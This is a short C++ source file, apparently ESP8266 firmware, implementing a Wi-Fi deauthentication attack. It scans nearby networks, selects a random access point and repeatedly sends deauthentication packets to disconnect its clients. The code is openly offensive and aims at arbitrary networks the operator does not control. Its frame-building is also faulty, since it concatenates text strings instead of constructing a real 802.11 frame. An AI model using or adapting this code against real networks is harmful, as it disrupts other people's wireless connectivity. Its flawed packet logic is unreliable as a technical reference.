#include "deauth.h"

DeauthAttack deauthAttack;  // Instantiate the deauthAttack object

void DeauthAttack::selectRandomAP() {
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        int randomIndex = random(apCount);
        randomAP = WiFi.SSID(randomIndex);

        Serial.print("Selected random AP: ");
        Serial.println(randomAP);
    } else {
        Serial.println("No access points found.");
    }
}

void DeauthAttack::startRandomDeauth() {
    if (randomAP.length() > 0) {
        Serial.println("Starting deauthentication attack on the selected AP...");
        // define the attack here
        if (!running) {
            // deauth, beacon, deauth all stations, probe, output, timeout
            start(true, false, false, false, true, 0);
        } else {
            Serial.println("Attack is already running.");
        }
    } else {
        Serial.println("No access point selected. Use selectRandomAP() first.");
    }
}

void DeauthAttack::start(bool param1, bool param2, bool param3, bool param4, bool param5, int param6) {
  running = true;

  // Craft and send deauthentication frame
  String reasonCode = "3"; // 3 corresponds to "Deauthenticated because sending STA is leaving (or has left) BSS"
  String deauthPacket = "c0:ff:ee:c0:ff:ee" + randomAP + reasonCode;
  uint8_t* deauthPacketBytes = (uint8_t*)deauthPacket.c_str();
  int packetSize = deauthPacket.length();

  // Send the deauthentication packet multiple times for a stronger effect
  for (int i = 0; i < 10; ++i) {
    wifi_send_pkt_freedom(deauthPacketBytes, packetSize, 0);
    delay(100);
  }

  running = false;
}
